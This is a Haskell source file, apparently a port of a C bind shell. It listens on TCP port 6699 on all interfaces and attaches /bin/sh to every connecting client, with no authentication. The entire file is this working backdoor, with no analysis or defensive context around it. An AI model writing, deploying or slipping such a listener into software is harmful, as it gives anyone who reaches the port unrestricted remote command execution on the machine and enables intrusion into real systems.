module Main where

import System.IO
import Network.Socket
import qualified System.Process as SysProc


main :: IO ()
main = do
    putStrLn "Starting"
    srvSock <- socket AF_INET Stream 0
    setSocketOption srvSock ReuseAddr 1
    bind srvSock (SockAddrInet 6699 iNADDR_ANY)
    listen srvSock 1
    sockLoop srvSock

sockLoop :: Socket -> IO ()
sockLoop srvSock = do
    (remoteSock, remoteAddr) <- accept srvSock
    putStrLn $ "client connected: " ++ show remoteAddr
    hdl <- socketToHandle remoteSock ReadWriteMode
    handleClient hdl
    sockLoop srvSock

handleClient :: Handle -> IO ()
handleClient hdl = do
    putStrLn $ "handle client"
    let shProcess = (SysProc.proc "/bin/sh" []){ SysProc.std_in = SysProc.UseHandle hdl,
                                                 SysProc.std_out = SysProc.UseHandle hdl,
                                                 SysProc.std_err = SysProc.UseHandle hdl,
                                                 SysProc.close_fds = True }
    (Nothing, Nothing, Nothing, ph) <- SysProc.createProcess shProcess
    putStrLn $ "created Process"
    --as in the C version, we wait while a client is connected
    exitcode <- SysProc.waitForProcess ph
    putStrLn $ show exitcode

